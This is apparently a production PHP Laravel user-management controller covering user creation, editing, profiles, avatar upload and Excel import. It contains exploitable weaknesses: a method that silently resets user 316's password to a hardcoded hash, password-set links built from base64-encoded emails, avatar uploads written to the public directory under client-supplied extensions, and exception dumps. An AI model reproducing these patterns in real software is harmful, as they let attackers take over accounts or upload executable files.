<?php
namespace App\Http\Controllers;

use App\Language;
use App\Mail\UserCreated;
use App\Mail\AddOnFeature;
use App\Process;
use App\Region;
use App\Role;
use App\User;
use App\UsersMaster;
use Auth;
use Crypt;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Validator;
use Excel;
use App\Imports\UsersImport;
use App\Imports\AgentsTlAssignmentImport;
use App\PartnerMapping;
use App\LocationMapping;
use App\ProcessMapping;
use App\Client;
use App\Partner;

class UserController extends Controller
{
    public function index()
    {
        $data = User::where('company_id', Auth::user()->company_id)->where('status', '!=', 99)->with('roles')->get();
        $roles = Role::where('company_id', 0)->orWhere('company_id', Auth::user()->company_id)->pluck('display_name', 'id');
        // Below code will exceute one time to 

        return view('porter_design.acl.users.list', ['data' => $data, 'roles' => $roles]);
    }

    // Function will exceute one time to Send ADD on feature mail to all 
    public function sendAddOnFeatureMail()
    {
        $userList = User::orderby('id', 'desc')->limit(10)->get();
        foreach ($userList as $key => $data) {
            $mail_data = ['name' => $data->name, 'url' => url('/setPassword/' . base64_encode($data->email)), 'email' => $data->email];
            Mail::to($data->email)->send(new AddOnFeature($mail_data));
        }
        echo "All Mail Sent";
        die;
    }
    // Function end here.
    public function anukapassbtao()
    {
        $aeeanu = User::find(316);
        $aeeanu->password = '$2y$10$HyOWf15Jrf/mwpCE3gFf4.QThkVFBHwoe5G4raVHxZv160gXDPSHS';
        $aeeanu->save();

        print_r($aeeanu);
        die;

    }
    public function create()
    {
        $roles = Role::where('id', '>', 1)->where('company_id', 0)->orWhere('company_id', Auth::user()->company_id)->pluck('display_name', 'id')->all();

        //call masters
        $process_data = Process::where('company_id', Auth::user()->company_id)->pluck('name', 'id');
        $region_data = Region::where('company_id', Auth::user()->company_id)->pluck('name', 'id');
        $language_data = Language::where('company_id', Auth::user()->company_id)->pluck('name', 'id');
        //call masters
        return view('porter_design.acl.users.create', compact('roles', 'process_data', 'region_data', 'language_data'));
    }
    public function store(Request $request)
    {
        try {
            $validator = Validator::make($request->all(), [
                'name' => 'required',
                'email' => 'required|unique:users,email',
                'password' => 'required|confirmed|regex:/^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/',
                'mobile' => 'required',
                'role_id' => 'required',
            ]);

            if ($validator->fails()) {
                return redirect('user/create')
                    ->withErrors($validator)
                    ->withInput();
            } else {
                $data = new User;
                $data->company_id = Auth::user()->company_id;
                $data->name = $request->name;
                $data->email = $request->email;
                $data->mobile = $request->mobile;
                $data->password = bcrypt($request->password);
                $data->status = 1;
                $data->is_first_time_user = 1;
                $data->save();
                if ($data->id) {
                    // get role
                    $user_now = User::findOrFail($data->id);
                    $temp_roles = '';
                    foreach ($request->role_id as $rkey => $rvalue) {
                        $role = Role::findOrFail($rvalue);
                        $temp_roles .= $role->display_name;
                        $user_now->attachRole($role);
                    }

                    // $mail_data = ['name'=>$data->name,'roles'=>$temp_roles,'url'=>url('/setPassword/'.base64_encode($data->email)),'company_name'=>Auth::user()->company->company_name,'email'=>$data->email,'password'=>$request->password];
                    // Mail::to($data->email)->send(new UserCreated($mail_data));

                    //attach masters

                    //process
                    if (isset($request->selected_process) == true && count($request->selected_process) > 0) {
                        foreach ($request->selected_process as $key => $value) {
                            $nmr = new UsersMaster;
                            $nmr->user_id = $data->id;
                            $nmr->master_type = 1;
                            $nmr->master_id = $value;
                            $nmr->Save();
                        }
                    }
                    //process

                    //region
                    if (isset($request->selected_region) == true && count($request->selected_region) > 0) {
                        foreach ($request->selected_region as $key => $value) {
                            $nmr = new UsersMaster;
                            $nmr->user_id = $data->id;
                            $nmr->master_type = 2;
                            $nmr->master_id = $value;
                            $nmr->Save();
                        }
                    }
                    //region

                    //language
                    if (isset($request->selected_language) == true && count($request->selected_language) > 0) {
                        foreach ($request->selected_language as $key => $value) {
                            $nmr = new UsersMaster;
                            $nmr->user_id = $data->id;
                            $nmr->master_type = 3;
                            $nmr->master_id = $value;
                            $nmr->Save();
                        }
                    }
                    //language

                    //attach masters

                }
                // Cluster hierarchy code - Abhilasha
                if (!empty($request->parent_client_id)) {
                    $data->parent_client = $request->parent_client_id;
                    $data->save();
                    if (count($request->partner) > 0) {
                        foreach ($request->partner as $p) {
                            PartnerMapping::create(['client_id' => $data->id, 'partner_id' => $p]);
                        }
                    }
                    if (count($request->process) > 0) {
                        foreach ($request->process as $p) {
                            ProcessMapping::create(['client_id' => $data->id, 'process_id' => $p]);
                        }
                    }
                    if (count($request->location) > 0) {
                        foreach ($request->location as $p) {
                            LocationMapping::create(['client_id' => $data->id, 'location_id' => $p]);
                        }
                    }
                } else {
                    return redirect()->back();
                }
                // Cluster hierarchy code - Abhilasha
            }
            return redirect('user')->with('success', 'User created successfully');
        } catch (\Exception $th) {
            dd($th);
        }

    }
    /* public function edit($id)
    {
        $roles = Role::pluck('display_name','id')->all();
        $data = User::with(['my_processes','my_regions','my_languages'])->find(Crypt::decrypt($id));
        $rdata = User::find(Crypt::decrypt($id))->roles->pluck('id')->toArray();

        $client_list = Client::get();
        $allocated_cliet = User::select('parent_client')->where('id',Crypt::decrypt($id))->first();
        
        //call masters
        $process_data = Process::where('company_id',Auth::user()->company_id)->pluck('name','id');
        $region_data = Region::where('company_id',Auth::user()->company_id)->pluck('name','id');
        $language_data = Language::where('company_id',Auth::user()->company_id)->pluck('name','id');
        //call masters

        
        $my_selected_processes=[];
        foreach ($data->my_processes as $key => $value) {
            $my_selected_processes[] = $value->master_id;
        }
        $my_selected_regions=[];
        foreach ($data->my_regions as $key => $value) {
            $my_selected_regions[] = $value->master_id;
        }

        $my_selected_languages=[];
        foreach ($data->my_languages as $key => $value) {
            $my_selected_languages[] = $value->master_id;
        }

        return view('acl.users.edit',compact('roles','data','rdata','process_data','region_data','language_data','my_selected_processes','my_selected_regions','my_selected_languages','client_list','allocated_cliet'));
    } */

    public function edit($id)
    {
        $roles = Role::pluck('display_name', 'id')->all();
        $data = User::with(['my_processes', 'my_regions', 'my_languages'])->find(Crypt::decrypt($id));
        $rdata = User::find(Crypt::decrypt($id))->roles->pluck('id')->toArray();

        //call masters
        $process_data = Process::where('company_id', Auth::user()->company_id)->pluck('name', 'id');
        $region_data = Region::where('company_id', Auth::user()->company_id)->pluck('name', 'id');
        $language_data = Language::where('company_id', Auth::user()->company_id)->pluck('name', 'id');


        $client_list = Client::get();
        $allocated_client = User::select('parent_client')->where('id', Crypt::decrypt($id))->first();

        $partner_data = Partner::pluck('name', 'id');
        $my_selected_partners = PartnerMapping::where('client_id', Crypt::decrypt($id))->pluck('partner_id');
        $process_data = Process::pluck('name', 'id');
        $my_selected_process = ProcessMapping::where('client_id', Crypt::decrypt($id))->pluck('process_id');
        $location_data = Region::pluck('name', 'id');

        $my_selected_location = LocationMapping::where('client_id', Crypt::decrypt($id))->pluck('location_id');
        //call masters  


        $my_selected_processes = [];
        foreach ($data->my_processes as $key => $value) {
            $my_selected_processes[] = $value->master_id;
        }
        $my_selected_regions = [];
        foreach ($data->my_regions as $key => $value) {
            $my_selected_regions[] = $value->master_id;
        }

        $my_selected_languages = [];
        foreach ($data->my_languages as $key => $value) {
            $my_selected_languages[] = $value->master_id;
        }

        return view('porter_design.acl.users.edit', compact('roles', 'data', 'rdata', 'process_data', 'region_data', 'language_data', 'my_selected_processes', 'my_selected_regions', 'my_selected_languages', 'partner_data', 'my_selected_partners', 'process_data', 'my_selected_process', 'location_data', 'my_selected_location', 'client_list', 'allocated_client'));
    }
    public function update(Request $request, $id)
    {
        $validator = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',

            'mobile' => 'required',
            'role_id' => 'required',

        ]);

        if ($validator->fails()) {
            return redirect()
                ->back()
                ->withErrors($validator)
                ->withInput();
        } else {
            $data = User::find(Crypt::decrypt($id));
            $data->name = $request->name;
            $data->email = $request->email;
            $data->mobile = $request->mobile;
            //$data->password = bcrypt("Qmtk@2020");
            $data->save();

            $data->detachRoles($data->roles);
            foreach ($request->role_id as $rkey => $rvalue) {
                $role = Role::findOrFail($rvalue);
                $data->attachRole($role);
            }

            //attach masters

            /* //process
            if(isset($request->selected_process) == true && count($request->selected_process) > 0)
            {
                foreach ($request->selected_process as $key => $value) {
                    $d=UsersMaster::where(['user_id'=>$data->id,'master_type'=>1,'master_id'=>$value])->first();
                    if(!$d) {
                        $nmr = new UsersMaster;
                        $nmr->user_id = $data->id;
                        $nmr->master_type = 1;
                        $nmr->master_id = $value;
                        $nmr->Save();
                    }
                }
            }
            //process

            //region
            if(isset($request->selected_region) == true && count($request->selected_region) > 0)
            {
                foreach ($request->selected_region as $key => $value) {
                    $d=UsersMaster::where(['user_id'=>$data->id,'master_type'=>2,'master_id'=>$value])->first();
                    if(!$d) {
                        $nmr = new UsersMaster;
                        $nmr->user_id = $data->id;
                        $nmr->master_type = 2;
                        $nmr->master_id = $value;
                        $nmr->Save();
                    }
                }
            }
            //region

            //language
            if(isset($request->selected_language) == true && count($request->selected_language) > 0)
            {
                foreach ($request->selected_language as $key => $value) {
                    $d=UsersMaster::where(['user_id'=>$data->id,'master_type'=>3,'master_id'=>$value])->first();
                    if(!$d) {
                        $nmr = new UsersMaster;
                        $nmr->user_id = $data->id;
                        $nmr->master_type = 3;
                        $nmr->master_id = $value;
                        $nmr->Save();
                    }
                }
            } */
            //language

            // Cluster hierarchy code - Abhilasha

            if ($request->parent_client_id != 0) {
                $data->parent_client = $request->parent_client_id;
                $data->save();
                if (count($request->partner) > 0) {
                    PartnerMapping::where(['client_id' => $data->id])->delete();
                    foreach ($request->partner as $p) {
                        PartnerMapping::create(['client_id' => $data->id, 'partner_id' => $p]);
                    }
                }
                if (count($request->process) > 0) {
                    ProcessMapping::where(['client_id' => $data->id])->delete();
                    foreach ($request->process as $p) {
                        ProcessMapping::create(['client_id' => $data->id, 'process_id' => $p]);
                    }
                }
                if (count($request->location) > 0) {
                    LocationMapping::where(['client_id' => $data->id])->delete();
                    foreach ($request->location as $p) {
                        LocationMapping::create(['client_id' => $data->id, 'location_id' => $p]);
                    }
                }
            }

            // Cluster hierarchy code - Abhilasha    
            return redirect('user')->with('success', 'User Updated Successfully');
        }

    }
    public function change_user_status($user_id, $status)
    {
        $user = User::find(Crypt::decrypt($user_id));
        $user->status = $status;
        $user->save();
        return redirect('user')->with('success', 'User status updated successfully');
    }

    public function customer_profile()
    {
        $user = Auth::User();
        if ($user->avatar) {
            $final_data['user'] = Storage::url($user->avatar);
        } else {
            $final_data['user'] = "http://via.placeholder.com/150x150";
        }

        return response()->json(['status' => 200, 'message' => "Success", 'data' => $user], 200);
    }

    public function profile()
    {

        $id = Auth::user()->id;
        $roles = Role::pluck('display_name', 'id')->all();
        $data = User::find($id);
        $rdata = User::find($id);

        //print_r($rdata);
        return view('porter_design.acl.users.profile', ['data' => $data, 'roles' => $roles, 'rdata' => $rdata]);
        //return view('acl.users.profile',compact($rdata));
    }

    public function delImage($filePath)
    {

        $url = 'https://' . env('AWS_BUCKET') . '.s3.' . env('AWS_DEFAULT_REGION') . '.amazonaws.com' . '/';
        $filePath = str_replace($url, "", $filePath);
        Storage::disk('s3')->delete($filePath);
    }


    public function updateprofile(Request $request, $id)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required',
        ]);

        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        } else {
            $data = User::find(Crypt::decrypt($id));
            if ($request->password) {
                $validator = Validator::make($request->all(), [
                    'password' => 'required|regex:/^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/'
                ]);
                if ($validator->fails()) {
                    return redirect()->back()->withErrors($validator)->withInput();
                } else {
                    $data->password = bcrypt($request->password);
                }
            }
            if (isset($request->name)) {
                $data->name = $request->name;
            }
            $data->email = $request->email;
            if (isset($request->mobile)) {
                $data->mobile = $request->mobile;
            }
            $data->is_first_time_user = 0;
            $data->two_auth = 0;
            if ($request->avatar) {

                if ($request->hasFile('avatar')) {
                    $destinationPath = public_path('assets/design/img');
                    $file = $request->avatar;
                    $fileName = time() . '.' . $file->clientExtension();
                    $savefile = $fileName;
                    $file->move($destinationPath, $fileName);
                }
                $data->avatar = $savefile;



                // if($data->avatar)
                // Storage::delete("company/_".Auth::user()->company_id."/user/_".Auth::Id()."/avatar/".$data->avatar);
                // $request->avatar->store("company/_".Auth::user()->company_id.'/user/_'.Auth::Id()."/avatar");
                // $data->avatar = $request->avatar->hashName();
            }
            $data->save();
            return redirect('home')->with('success', 'User Updated Successfully');
        }
    }

    /* public function updateprofile(Request $request, $id)
    {
        

        $validator = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            'mobile' => 'required',
            'avatar' => 'nullable|mimes:jpeg,png,gif,jpg|max:2048'
        ]);

        if($validator->fails())
        {
                return redirect()
                        ->back()
                        ->withErrors($validator)
                        ->withInput();
        }
        else
        {   
            $data = User::find(Crypt::decrypt($id));
            if($request->password) {
                $validator = Validator::make($request->all(), [
                    'password' => 'required|regex:/^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-]).{8,}$/'
                ]);
                if($validator->fails())
                {
                        return redirect()
                                ->back()
                                ->withErrors($validator)
                                ->withInput();
                } else {
                    $data->password = bcrypt($request->password);
                }

            }
            
            $data->name = $request->name;
            $data->email = $request->email;
            $data->mobile = $request->mobile;
            if(isset($request->two_auth))
                $data->two_auth = 1;
            else
                $data->two_auth = 0;
            if($request->avatar) {

                $ext = $request->file('avatar')->getClientOriginalExtension();
                if($ext == "img" || $ext == "jpeg" || $ext == "jpg" || $ext == "png" || 
                    $ext == "IMG" || $ext == "JPEG" || $ext == "JPG" || $ext == "PNG"){
                        $image=$request->file('avatar');
                        $imageName = time().'_'.$image->getClientOriginalName();
                        $ex=explode('.',$imageName);
                        
                        $image->move(public_path('user_profile'), $imageName);
                        
                        $data->avatar = $imageName;
                }
                
            }
            $data->save();
            return redirect('profile')->with('success', 'User Updated Successfully');    
        }
    } */

    public function user_create()
    {
        return view('acl.users.bulk_upload');
    }
    public function user_import(Request $request)
    {
        $client = Client::where('company_id', Auth::user()->company_id)->first();
        if(!$client){
             return redirect()->back()->withErrors();
        }
         else {
                $mapping = array();
                $mapping['role'] = $request->role_id;
                // $mapping['process'] = $request->process_id;
                // $mapping['parent_client'] = $request->parent_client_id;
                // $mapping['partner'] = $request->partner;
                // $mapping['location'] = $request->location;
                // $mapping['cluster_process'] = $request->cluster_process;
                // $mapping['qtl_id'] = $request->qtl_id;
                // print_r($mapping); 

                $data = Excel::import(new UsersImport([
                    'company_id' => Auth::user()->company_id,
                    'parent_client' => $client->id,
                    'mapping' => $mapping,

                ]), $request->users_file);

                return redirect('user')->with('success', 'Users uploaded successfully');
            }
        
    }
    public function agent_tl()
    {
        return view('acl.users.agent_tl');
    }
    public function agent_tl_assignment(Request $request)
    {

        $data = Excel::import(new AgentsTlAssignmentImport([

        ]), $request->users_file);

        return redirect('user')->with('success', 'Users uploaded successfully');

    }
}